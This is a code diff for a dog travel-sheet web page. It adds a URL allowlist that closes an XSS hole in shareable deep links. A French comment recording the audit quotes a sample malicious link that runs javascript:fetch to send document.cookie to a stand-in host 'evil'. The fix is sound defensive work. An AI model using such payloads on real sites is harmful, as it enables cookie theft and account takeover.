@@ -272,6 +272,14 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
     const C = JSON.parse(document.getElementById("bible-cfg")?.textContent ?? "{}");
     const T = C.T;
     const esc = (s) => String(s ?? "").replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
+    /* Faille corrigée (audit du 09/08/2026) : cette fiche est un lien profond partageable — tout
+       son contenu, y compris `air.site`/`air.fiche` (paramètres d'URL `as`/`af`), vient de la
+       query string. `esc()` échappe les entités HTML mais ne filtre AUCUN schéma d'URL : un lien
+       forgé `…&as=javascript:fetch('//evil/'+document.cookie)` passait tel quel dans un
+       `href="${esc(air.site)}"`, échappé pour le HTML mais toujours exécutable au clic. `safeUrl`
+       n'autorise que http(s): — toute autre valeur (javascript:, data:, vbscript:…) devient une
+       chaîne vide, ce qui fait disparaître le bouton/lien plutôt que de le rendre dangereux. */
+    const safeUrl = (s) => { const v = String(s ?? "").trim(); return /^https?:\/\//i.test(v) ? v : ""; };
     const mkRe = (arr) => (arr && arr.length)
       ? new RegExp('(?<![A-Za-zÀ-ÿ])(' + arr.map((w) => w.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')).join('|') + ')(?![A-Za-zÀ-ÿ])', 'gi')
       : null;
@@ -292,7 +300,7 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
     const O = DATA[from], D = DATA[to];
     if (!O || !D) { /* keep the empty hint */ }
     else {
-      const air = { name: P.get("an") || "", site: P.get("as") || "", fiche: P.get("af") || "",
+      const air = { name: P.get("an") || "", site: safeUrl(P.get("as")), fiche: safeUrl(P.get("af")),
         cabin: P.get("cab") === "1", hold: P.get("hold") === "1", cargo: P.get("cargo") === "1",
         direct: P.get("direct") === "1", fee: P.get("fee") || "", embargo: P.get("emb") === "1" };
       const breed = P.get("breed") || "", brachy = P.get("brachy") === "1", w = P.get("w") || "";
